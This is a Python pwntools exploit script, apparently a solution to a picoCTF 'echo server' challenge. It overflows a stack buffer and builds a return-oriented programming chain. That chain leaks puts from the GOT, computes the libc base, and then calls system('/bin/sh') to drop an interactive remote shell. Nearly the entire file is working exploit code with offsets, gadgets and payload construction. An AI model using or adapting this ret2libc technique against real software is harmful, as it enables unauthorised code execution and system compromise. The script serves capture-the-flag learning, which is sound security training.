#!/usr/bin/env python3

from pwn import *

def sploit():
    context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
    #p = process("./vuln_patched")
    p = remote('mercury.picoctf.net', 49464)
    #gdb.attach(p) # Debug ROP Chain

    #sleep(5) # The execution of the process and communication with it is too fast, or spinning up gdb is too slow, either way this allows to attach before any coms happen

    # char buffer[x70] (112)
    
    # char *buf = RBP-x80
    # buf -> x80
    # RBP -> x8
    # RIP -> x8

    # ROP Chain Theory
    # 
    # RBP -> 0x8 <- address of a libc function in the .got.plt GOT
    # RIP -> 0x8 <- address to get stack value into RDI
    # ROP -> 0x8 <- address of puts in .plt (essentially calling puts)
    # ROP -> 0x8 <- address of main to reset

    # ROP Chain
    #
    # stack_fill[x80]
    # scanf_got 0x601038
    # gadget_pop_rdi 0x400913
    # puts_plt 0x00400540
    # main 0x00400771

    offset = 128
    stack_fill = b"A" * offset
    ebp_fill = b"A" * 8
    gadget_pop_rdi = p64(0x400913)
    #scanf_got = p64(0x601038)
    puts_got = p64(0x601018) # <- puts worked, and setbuf works as well, but why not scanf??
    #setbuf_got = p64(0x601028)
    puts_plt = p64(0x400540)
    main = p64(0x400771)

    payload = [
        stack_fill,
        ebp_fill,
        gadget_pop_rdi,
        puts_got,
        puts_plt,
        main
    ]

    payload = b''.join(payload)

    p.sendlineafter(b"WeLcOmE To mY EcHo sErVeR!", payload)
    p.recvline()
    p.recvline()
    resp = p.recvline().strip()

    leak = u64(resp.ljust(8, b"\x00"))
    log.info('leak={}'.format(hex(leak)))

    #scanf_offset = 0x7b0b0
    put_offset = 0x80a30 # <- puts worked, and setbuf works as well, but why not scanf??
    #setbuf_offset = 0x88540
    system_offset = 0x4f4e0
    bin_sh_offset = 0x1b40fa # used strings -tx then grepped for /bin/sh
    libc_base_address = leak - put_offset

    log.info('base address={}'.format(hex(libc_base_address)))

    system_address = libc_base_address + system_offset
    bin_sh_address = libc_base_address + bin_sh_offset

    

    # Second ROP Chain
    # buff[x80] <- A's
    # RBP 0x8 <- A's
    # RBI 0x8 <- ROP gadget
    # UNK 0x8 <- bin_sh_address
    # UNK 0x8 <- system_address
    # UNK 0x8 <- main address (shouldnt need tho since the process should be replaced by /bin/sh)

    stack_fill = b"A" * 136
    pop_rdi_address = p64(0x400913)
    bin_sh_address = p64(bin_sh_address)
    system_address = p64(system_address)
    return_address = p64(0x4005bf)

    payload = [
        stack_fill,
        pop_rdi_address,
        bin_sh_address,
        #return_address, # needed for stack alignment in this specific spot?? Could I also use NOPS?
        system_address
    ]

    payload = b''.join(payload)
    log.info('Sending ROP shell?')
    p.sendline(payload)

    p.interactive()

def main():
    sploit()


if __name__ == "__main__":
    main()
